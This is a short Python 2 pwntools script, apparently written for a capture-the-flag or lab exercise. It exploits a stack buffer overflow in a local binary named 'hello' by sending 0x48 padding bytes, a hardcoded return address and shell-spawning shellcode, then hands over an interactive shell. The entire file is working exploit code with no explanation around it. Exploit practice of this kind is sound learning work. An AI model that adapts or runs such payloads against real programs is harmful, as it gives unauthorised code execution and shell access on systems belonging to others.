#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
import os
context.log_level="debug"
context(arch="amd64",os="linux")

p=process('./hello')
shellcode=asm(shellcraft.sh())
len_sc=len(shellcode)
payload=0x48*'0'+p64(0x00007ffff7a08118)+shellcode
with open('payload.txt', 'w') as f:
	f.write(payload)
p.sendline(payload)
p.interactive()
